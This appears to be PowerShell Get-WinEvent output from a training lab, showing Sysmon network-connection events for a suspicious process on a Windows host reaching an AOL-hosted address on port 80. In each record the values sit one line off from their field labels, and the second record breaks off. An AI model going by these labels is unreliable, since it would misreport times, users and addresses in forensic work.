+PS C:\Users\THM-Analyst> Get-WinEvent -Path C:\Users\THM-Analyst\Desktop\Scenarios\Investigations\Investigation-3.2.evtx -FilterXPath '*/System/EventID=3' | fl
+
+TimeCreated  : 2/5/2018 7:08:55 AM
+ProviderName : Microsoft-Windows-Sysmon
+Id           : 3
+Message      : Network connection detected:
+               RuleName: 2018-02-05 07:08:53.923
+               UtcTime: {b231f4ab-f2e9-5a77-0000-0010cb670802}
+               ProcessGuid: 11020
+               ProcessId: 0
+               Image: DESKTOP-O153T4R\q
+               User: tcp
+               Protocol: true
+               Initiated: false
+               SourceIsIpv6: 172.168.103.167
+               SourceIp: DESKTOP-O153T4R.SSG-350M
+               SourceHostname: 52984
+               SourcePort: 0
+               SourcePortName: false
+               DestinationIsIpv6: 172.168.103.188
+               DestinationIp: ACA867BC.ipt.aol.com
+               DestinationHostname: 80
+               DestinationPort: 0
+               DestinationPortName: %18
+
+TimeCreated  : 2/5/2018 7:08:55 AM
+ProviderName : Microsoft-Windows-Sysmon
+Id           : 3
+Message      : Network connection detected:
+               RuleName: 2018-02-05 07:08:53.650
+               UtcTime: {b231f4ab-f2e9-5a77-0000-0010cb670802}
+               ProcessGuid: 11020
+               ProcessId: 0
+               Image: DESKTOP-O153T4R\q
+               User: tcp
+               Protocol: true
+               Initiated: false
+               SourceIsIpv6: 172.168.103.167
